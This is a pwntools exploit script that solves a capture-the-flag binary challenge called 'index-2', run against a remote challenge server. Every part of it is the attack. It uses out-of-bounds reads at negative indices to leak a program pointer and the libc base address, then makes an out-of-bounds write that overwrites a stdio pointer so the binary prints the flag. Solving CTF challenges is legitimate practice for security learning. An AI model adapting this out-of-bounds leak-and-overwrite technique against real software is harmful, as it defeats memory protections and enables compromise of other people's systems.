from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./index-2"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "play.scriptsorcerers.xyz", 10324)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


# leak f
io.sendlineafter("Exit\n", "1337")
io.sendlineafter("Exit\n", "2")
ddebug("breakrva 0x0133d\n continue")
io.sendlineafter("Index: ", "8")
io.recvuntil("Data: ", drop=True)
f = u64(io.recv(6).ljust(8, b"\x00"))
log.success("f:-----> " + hex(f))

# leak libc
io.sendlineafter("Exit\n", "2")
io.sendlineafter("Index: ", "-17")
io.recvuntil("Data: ", drop=True)
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x29ce0
log.success("libc.address :-----> " + hex(libc.address))

# stdio->f
io.sendlineafter("Exit\n", "1")
io.sendlineafter("Index: ", "-6")
io.sendlineafter("Data: ", p64(f))

# printf
io.sendlineafter("Exit\n", "3")
io.sendlineafter("Do you want the flag?", "tinyfat")


io.interactive()
